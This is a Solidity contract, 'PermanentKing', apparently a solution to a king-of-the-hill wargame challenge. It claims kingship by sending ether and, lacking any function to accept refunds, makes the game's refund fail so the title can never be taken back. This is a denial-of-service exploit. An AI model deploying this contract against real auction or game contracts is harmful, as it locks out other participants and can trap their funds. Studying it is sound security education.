// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract PermanentKing {
    address payable game;

    constructor(address _game) {
        game = payable(_game);
    }

    function takeKingship() payable public {
        (bool success, ) = game.call{value: msg.value}("");
        if (!success) revert("Game contract rejected the kingship transfer");
    }
}